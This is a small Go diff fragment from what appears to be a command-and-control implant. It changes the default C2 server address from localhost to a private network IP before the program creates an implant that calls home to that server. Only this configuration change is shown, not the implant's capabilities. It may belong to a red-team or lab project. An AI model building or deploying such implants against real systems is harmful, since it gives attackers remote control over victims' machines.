@@ -30,7 +30,7 @@ func main() {
 		//run the 
 		c2ServerURL := os.Getenv("C2_URL")
 		if c2ServerURL == "" {
-			c2ServerURL = "http://localhost:5000"
+			c2ServerURL = "http://192.168.1.247:5000"
 		}
 		defer mymutex.ReleaseMutex(mutex)
 		implant := NewImplant(c2ServerURL)
